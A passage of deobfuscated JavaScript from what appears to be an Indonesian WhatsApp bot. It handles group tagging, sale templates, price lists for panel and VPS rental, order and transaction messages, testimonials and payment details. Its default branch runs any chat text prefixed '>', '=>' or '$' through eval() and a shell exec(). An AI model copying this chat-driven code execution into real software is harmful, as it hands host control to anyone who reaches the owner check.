‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n⌜ TAGG KABEHAN BY KAZEY OFFCIAL ⌟\n";
          for (let v1201 of v658) {
            v1200 += "⊝ @" + v1201.id.split("@")[0] + "\n";
          }
          p147.sendMessage(v650, {
            text: v1200,
            mentions: v658.map(p285 => p285.id)
          }, {
            quoted: p148
          });
        }
        break;
      case "public":
        {
          if (!v700) {
            return vF9(mess.only.owner);
          }
          p147.public = true;
          vF9(mess.success);
        }
        break;
      case "self":
        {
          if (!v700) {
            return vF9(mess.only.owner);
          }
          p147.public = false;
          vF9(mess.success);
        }
        break;
      case "formatneed":
        {
          const v1202 = "*FORMAT JASA NEED AKUN BY " + botname + "*\n*( BUKAN AKUN ADMIN )*\n\nNAMA PEMILIK : \nAKUN :\nLOGIN :\nHARGA : \nSPEK AKUN :  \n  \n*#TIDAK MENERIMA KIRKON*\n\n📝𝐍𝐎𝐓𝐄 : \n*WAJIB MENGGUNAKAN JASA ADMIN " + botname + " UNTUK MENGHINDARI PENIPUAN*\n\n*PERINGATAN ⚠️*\n*MOHON NAMA PEMILIK AKUNNYA HARUS DI ISI DENGAN BENAR AGAR SELLER GAMPANG DI CARI*";
          p147.sendMessage(v650, {
            image: {
              url: "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg"
            },
            caption: v1202,
            fileLength: 10,
            contextInfo: {
              mentionedJid: [v653],
              forwardingScore: 9999,
              isForwarded: true
            }
          }, {
            quoted: p148
          });
        }
        break;
      case "formatpost":
        {
          const v1203 = "🥀FORMAT JASPOST BY " + botname + "🥀\n(BUKAN AKUN MILIK ADMIN)\n                   \nJUAL AKUN :\nSPEK :\nHARGA:\nNOMER : wa.me/\n\n\nNOTE‼️: WAJIB MENGGUNAKAN JASA ADMIN " + botname + " AGAR TERHINDAR DARI PENIPUAN\n\n\n🥀BEE SMART BUYER🥀";
          p147.sendMessage(v650, {
            image: {
              url: "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg"
            },
            caption: v1203,
            fileLength: 10,
            contextInfo: {
              mentionedJid: [v653],
              forwardingScore: 9999,
              isForwarded: true
            }
          }, {
            quoted: p148
          });
        }
        break;
      case "feerekber":
        {
          const v1204 = "FEE BER² " + botname + "\n•0 - 20K ≠ 5K\n•21K - 150K ≠ 10K\n•151K - 200K ≠ 15K\n•201K - 324K ≠ 20K\n•325K - 400K ≠ 25K\n•401K - 500K ≠ 30K\n•501K - 599K ≠ 35K\n•600K - 699K ≠ 40K\n•700K - 799K ≠ 45K\n•800K - 1JT ≠ 50K\n•1,1JT - 1,7JT ≠ 70K\n•1,8JT - 2,5JT ≠ 100K\n•BTBER ≠ 50K \n•TTBEB ≠ 50K";
          p147.sendMessage(v650, {
            image: {
              url: "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg"
            },
            caption: v1204,
            fileLength: 10,
            contextInfo: {
              mentionedJid: [v653],
              forwardingScore: 9999,
              isForwarded: true
            }
          }, {
            quoted: p148
          });
        }
        break;
      case "listpanel":
        {
          const v1205 = "SEWA PANEL drayyy\n\n➠ PANEL PROMO FRESH PROMO\n\n╭━「 PAKET SILVER 」\n│⛁ RAM 1GB | CPU 30%\n╰━━━☉ HARGA : 3k\n\n╭━「 PAKET SILVER 」\n│⛁ RAM 2GB | CPU 50%\n╰━━━☉ HARGA : 5k\n\n╭━「 PAKET GOLD 」\n│⛁ RAM 3GB | CPU 70%\n╰━━━☉ HARGA : 7K\n\n╭━「 PLATINUM (HOT) 」\n│⛁ RAM 4GB | CPU 90%\n╰━━━☉ HARGA : 9K\n\n╭━「 EXECUTIVE 」\n│⛁ RAM 5GB | CPU 100%\n╰━━━☉ HARGA : 10K\n\n╭━「 ULTIMATE (HOT) 」\n│⛁ RAM 7GB | CPU 130%\n╰━━━☉ HARGA : 12K\n\n╭━「 SUPER ULTIMATE 」\n│⛁ RAM UNLI | CPU UNLI%\n╰━━━☉ HARGA : 15K\n\n*Reqwest ram dan cpu chat langsung\n\nKeuntungan sewa panel di kami?\n➠ Server terjaga \n➠ Jual kualitas bukan asal jual\n➠ Hemat kuota \n➠ Hemat penyimpanan\n➠ Web close? bot tetep on!\n\n*Harga diatas adalah untuk 1bulan\n\nMINAT CHAT : \nhttps://wa.me/6283169231840";
          p147.sendMessage(v650, {
            image: {
              url: "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg"
            },
            caption: v1205,
            fileLength: 10,
            contextInfo: {
              mentionedJid: [v653],
              forwardingScore: 9999,
              isForwarded: true
            }
          }, {
            quoted: p148
          });
        }
        break;
      case "listvps":
        {
          const v1206 = "OPEN VPS NYA JUGA BUAT SERVER SENDIRI\nREADY PROMO VPS NYA KAK ‼️\n\nLIST :\n📮 VPS RAM 16GB 8 CORE : 100K\n📮 VPS RAM 8GB 4 CORE : 55K\n📮 VPS RAM 4GB 2 CORE : 45K\n📮 VPS RAM 2GB 1 CORE : 35K\n📮 VPS RAM 1GB 1 CORE : 25K\n\nKEUNTUNGAN :\nBUY VPS RAM 4 & 8 FREE SC TEMA\nFREE INSTAL PANEL\nNEGO KE PM AJA ASAL MENGOTAK\n FREE SC CRETAE PANEL BUY VPS RAM 4 & 8";
          p147.sendMessage(v650, {
            image: {
              url: "https://telegra.ph/file/5418e8dfe89ded1d7953d.jpg"
            },
            caption: v1206,
            fileLength: 10,
            contextInfo: {
              mentionedJid: [v653],
              forwardingScore: 9999,
              isForwarded: true
            }
          }, {
            quoted: p148
          });
        }
        break;
      case "produklain":
        {
          const v1207 = "💎MENYEDIAKAN\n\n• OPEN OWNER = 35k\n• JASA EDIT SCRIPT PANEL = TERGANTUNG\n• JASA TAMBAH FITUR SCRIPT = TERGANTUNG\n• JASA FIX SCRIPT EROR = TERGANTUNG\n• JASA BUAT SC PRIBADI = TERGANTUNG\n• JASA INSTALL PANEL PTERIDACTYL = 10K\n• JASA INSTALL THEME = 10K BISA NEGO\n• READY Panel RUN BOT ON 24 JAM = KEITK .listpanel\n• READY VPS = KETIK .listvps\n• READY ADMIN PANEL = 15K\n• READY RESELLER PANEL = 10K\n• READY SC NO ENC 100% = TANYA AJA \n• READY SC CPANEL BY dray = 15-20K\n• READY SC PUSHKONTAK X STORE BY dray = 10K\n• DLL TANYA AJA KALO ADA YANG DI BUTUHIN";
          p147.sendMessage(v650, {
            image: {
              url: "https://telegra.ph/file/44a68808942d029924e24.jpg"
            },
            caption: v1207,
            fileLength: 10,
            contextInfo: {
              mentionedJid: [v653],
              forwardingScore: 9999,
              isForwarded: true
            }
          }, {
            quoted: p148
          });
        }
        break;
      case "setproses":
      case "setp":
        {
          if (!v700) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v646) {
            return p148.reply("Gunakan dengan cara " + (v626 + v642) + " *teks*\n\n_Contoh_\n\n" + (v626 + v642) + " Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) ");
          }
          if (isSetProses(p148.isGroup ? p148.chat : v644, v667)) {
            return p148.reply("Set proses already active");
          }
          addSetProses(v646, p148.isGroup ? p148.chat : v644, v667);
          vF9("✅ Done set proses!");
        }
        break;
      case "changeproses":
      case "changep":
        {
          if (!v700) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v646) {
            return p148.reply("Gunakan dengan cara " + (v626 + v642) + " *teks*\n\n_Contoh_\n\n" + (v626 + v642) + " Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) ");
          }
          if (isSetProses(p148.isGroup ? p148.chat : v644, v667)) {
            changeSetProses(v646, p148.isGroup ? p148.chat : v644, v667);
            p148.reply("Sukses ubah set proses!");
          } else {
            addSetProses(v646, p148.isGroup ? p148.chat : v644, v667);
            p148.reply("Sukses ubah set proses!");
          }
        }
        break;
      case "delsetproses":
      case "delsetp":
        {
          if (!v700) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!isSetProses(p148.isGroup ? p148.chat : v644, v667)) {
            return p148.reply("Belum ada set proses di gc ini");
          }
          removeSetProses(p148.isGroup ? p148.chat : v644, v667);
          vF9("Sukses delete set proses");
        }
        break;
      case "setdone":
        {
          if (!v700) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v646) {
            return p148.reply("Gunakan dengan cara " + (v626 + v642) + " *teks*\n\n_Contoh_\n\n" + (v626 + v642) + " Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) ");
          }
          if (isSetDone(p148.isGroup ? p148.chat : v644, v668)) {
            return p148.reply("Udh set done sebelumnya");
          }
          addSetDone(v646, p148.isGroup ? p148.chat : v644, v668);
          vF9("Sukses set done!");
          break;
        }
      case "changedone":
      case "changed":
        {
          if (!v700) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v646) {
            return p148.reply("Gunakan dengan cara " + (v626 + v642) + " *teks*\n\n_Contoh_\n\n" + (v626 + v642) + " Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) ");
          }
          if (isSetDone(p148.isGroup ? p148.chat : v644, v668)) {
            changeSetDone(v646, p148.isGroup ? p148.chat : v644, v668);
            p148.reply("Sukses ubah set done!");
          } else {
            addSetDone(v646, p148.isGroup ? p148.chat : v644, v668);
            p148.reply("Sukses ubah set done!");
          }
        }
        break;
      case "delsetdone":
      case "delsetd":
        {
          if (!v700) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!isSetDone(p148.isGroup ? p148.chat : v644, v668)) {
            return p148.reply("Belum ada set done di gc ini");
          }
          removeSetDone(p148.isGroup ? p148.chat : v644, v668);
          p148.reply("Sukses delete set done");
        }
        break;
      case "p":
      case "proses":
        {
          if (!v700) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!p148.quoted) {
            return p148.reply("Reply pesanan yang akan proses");
          }
          let v1208 = p148.quoted ? v647.text : v647.text.split(v643[0])[1];
          let v1209 = "「 *TRANSAKSI PENDING* 」\n\n```📆 TANGGAL : @tanggal\n⌚ JAM     : @jam\n✨ STATUS  : Pending```\n\n📝 Catatan :\n@pesanan\n\nPesanan @user sedang di proses!";
          const vGetTextSetProses2 = getTextSetProses(p148.isGroup ? p148.chat : v644, v667);
          if (vGetTextSetProses2 !== undefined) {
            var v1213 = vGetTextSetProses2.replace("@pesanan", v1208 ? v1208 : "-").replace("@user", "@" + p148.quoted.sender.split("@")[0]).replace("@jam", v702).replace("@tanggal", vF6(new Date())).replace("@user", "@" + p148.quoted.sender.split("@")[0]);
            p147.sendTextWithMentions(p148.chat, v1213, p148);
          } else {
            p147.sendTextWithMentions(p148.chat, v1209.replace("@pesanan", v1208 ? v1208 : "-").replace("@user", "@" + p148.quoted.sender.split("@")[0]).replace("@jam", v702).replace("@tanggal", vF6(new Date())).replace("@user", "@" + p148.quoted.sender.split("@")[0]), p148);
          }
        }
        break;
      case "d":
      case "done":
        {
          if (!v700) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!p148.quoted) {
            return p148.reply("Reply pesanan yang telah di proses");
          }
          let v1211 = p148.quoted ? v647.text : v647.text.split(v643[0])[1];
          let v1212 = "「 *TRANSAKSI BERHASIL* 」\n\n```📆 TANGGAL : @tanggal\n⌚ JAM     : @jam\n✨ STATUS  : Berhasil```\n\nTerimakasih @user Next Order ya🙏";
          const vGetTextSetDone2 = getTextSetDone(p148.isGroup ? p148.chat : v644, v668);
          if (vGetTextSetDone2 !== undefined) {
            var v1213 = vGetTextSetDone2.replace("@pesanan", v1211 ? v1211 : "-").replace("@user", "@" + p148.quoted.sender.split("@")[0]).replace("@jam", v702).replace("@tanggal", vF6(new Date())).replace("@user", "@" + p148.quoted.sender.split("@")[0]);
            p147.sendTextWithMentions(p148.chat, v1213, p148);
          } else {
            p147.sendTextWithMentions(p148.chat, v1212.replace("@pesanan", v1211 ? v1211 : "-").replace("@user", "@" + p148.quoted.sender.split("@")[0]).replace("@jam", v702).replace("@tanggal", vF6(new Date())).replace("@user", "@" + p148.quoted.sender.split("@")[0]), p148);
          }
        }
        break;
      case "addtesti":
        {
          if (!v700) {
            return vF9(mess.owner);
          }
          if (v643.length < 1) {
            return vF9("Apa nama testinya?");
          }
          if (v662.includes(q)) {
            return vF9("Nama tersebut sudah digunakan");
          }
          let v1214 = await p147.downloadAndSaveMediaMessage(v647);
          v662.push(q);
          await fsExtra.copy(v1214, "./database/dray/" + q + ".jpg");
          fs3.writeFileSync("./database/testimoni.json", JSON.stringify(v662));
          fs3.unlinkSync(v1214);
          vF9("Sukses Menambakan Testimoni\nCek Dengan Mengetik " + v626 + "testimoni");
        }
        break;
      case "deltesti":
        {
          if (!v700) {
            return vF9(mess.owner);
          }
          if (v643.length < 1) {
            return vF9("Masukkan nama gambar");
          }
          if (!v662.includes(q)) {
            return vF9("Namanya tidak ada di database");
          }
          let v1215 = v662.indexOf(q);
          v662.splice(v1215, 1);
          fs3.writeFileSync("./database/testimoni.json", JSON.stringify(v662));
          fs3.unlinkSync("./database/dray/" + q + ".jpg");
          vF9("Sukses Delete Testi " + q);
        }
        break;
      case "testimoni":
        {
          let v1216 = "┌──⭓「 *testi List* 」\n│\n";
          for (let v1217 of v662) {
            v1216 += "│⭔ " + v1217 + "\n";
          }
          v1216 += "│\n└────────────⭓\n\n*Totally there are : " + v662.length + "*";
          vF9(v1216);
        }
        break;
      case "donasi":
        {
          const v1218 = global.ownerNumber + "@s.whatsapp.net";
          let v1219 = "*-------「 DONASI BY DRAY 」 -------*\n\nUNTUK QRIS SILAHKAN SCAN FOTO DI ATAS\n\nDANA : 083169231840\nOVO : 083169231840\nGOPAY : 083169231840\n\n*KETIK .proses AGAR PESANAN ANDA LANGSUNG*\n*KAMI PROSES*";
          p147.sendMessage(v650, {
            image: {
              url: "https://telegra.ph/file/34b0c1061097900bffd29.jpg"
            },
            caption: "" + v1219
          }, {
            quoted: p148
          });
        }
        break;
      case "payment":
        {
          const v1220 = global.ownerNumber + "@s.whatsapp.net";
          let v1221 = "*-------「 PAYMENT BY DRAY 」 -------*\n\nUNTUK QRIS SILAHKAN SCAN FOTO DI ATAS\n\nDANA : " + dana + "\nOVO : " + gopay + "\nGOPAY : " + ovo + "\nSHOPEEPAY : " + shp + "\n\n*KETIK .proses AGAR PESANAN ANDA LANGSUNG*\n*KAMI PROSES*";
          p147.sendMessage(v650, {
            image: qris,
            caption: "" + v1221
          }, {
            quoted: p148
          });
        }
        break;
      case "tunda":
        {
          const v1222 = "*TRANSAKSI MENGALAMI PENDING*\n\n\n𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚\n𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥\n\n*AKAN KAMI PROSES SEGERA*";
          vF9(v1222);
        }
        break;
      case "batal":
        {
          const v1223 = "*TRANSAKSI DI BATALKAN*\n\n📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: " + vF6 + "\n🕰️ 𝗪𝗮𝗸𝘁𝘂: " + jam + "\n✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal\n\n𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹\n";
          vF9(v1223);
        }
        break;
      case "del":
      case "delete":
        {
          if (v651) {
            if (!v700 && !v661) {
              return p148.reply(msg.admin);
            }
            if (!p148.quoted) {
              return p148.reply("Reply Pesan Yang Ingin Di Hapus");
            }
            if (p148.quoted.sender == v644) {
              p147.sendMessage(p148.chat, {
                delete: {
                  remoteJid: p148.chat,
                  fromMe: true,
                  id: p148.quoted.id,
                  participant: p148.quoted.sender
                }
              });
            } else {
              if (!v660) {
                return p148.reply(msg.adminbot);
              }
              p147.sendMessage(p148.chat, {
                delete: {
                  remoteJid: p148.chat,
                  fromMe: false,
                  id: p148.quoted.id,
                  participant: p148.quoted.sender
                }
              });
            }
          } else {
            if (!v700) {
              return p148.reply(msg.owner);
            }
            if (!p148.quoted) {
              return p148.reply("Reply Pesan Yang Ingin Di Hapus");
            }
            p147.sendMessage(p148.chat, {
              delete: {
                remoteJid: p148.chat,
                fromMe: false,
                id: p148.quoted.id,
                participant: p148.quoted.sender
              }
            });
          }
        }
        break;
      default:
        if (v625.startsWith("=>")) {
          if (!v700) {
            return false;
          }
          function f27(p286) {
            sat = JSON.stringify(p286, null, 2);
            bang = util2.format(sat);
            if (sat == undefined) {
              bang = util2.format(p286);
            }
            return vF9(bang);
          }
          try {
            vF9(util2.format(eval("(async () => { return " + v625.slice(3) + " })()")));
          } catch (_0x4742dd) {
            vF9(String(_0x4742dd));
          }
        }
        if (v625.startsWith(">")) {
          if (!v700) {
            return false;
          }
          try {
            let v1224 = await eval(v625.slice(2));
            if (typeof v1224 !== "string") {
              v1224 = require("util").inspect(v1224);
            }
            await vF9(v1224);
          } catch (_0x1a6ddb) {
            await vF9(String(_0x1a6ddb));
          }
        }
        if (v625.startsWith("$")) {
          if (!v700) {
            return false;
          }
          exec(v625.slice(2), (p287, p288) => {
            if (p287) {
              return vF9(p287);
            }
            if (p288) {
              return vF9(p288);
            }
          });
        }
        if (v625.match && ["anj", "ngentod", "anjg", " kontol", "asu"].includes(v625) && !v641) {
          vF9("*Dont Toxic*");
        }
        if (v641 && v625.toLowerCase() != undefined) {
          if (v650.endsWith("broadcast")) {
            return;
          }
          if (p148.isBaileys) {
            return;
          }
          let v1225 = global.db.data.database;
          if (!(v625.toLowerCase() in v1225)) {
            return;
          }
          p147.copyNForward(v650, v1225[v625.toLowerCase()], true);
        }
    }
  } catch (_0x36b7e3) {
    p148.reply(util2.format(_0x36b7e3));
  }
};
let v1226 = require.resolve(__filename);
fs3.watchFile(v1226, () => {
  fs3.unwatchFile(v1226);
  console.log(chalk2.redBright("Update " + __filename));
  delete require.cache[v1226];
  require(v1226);
});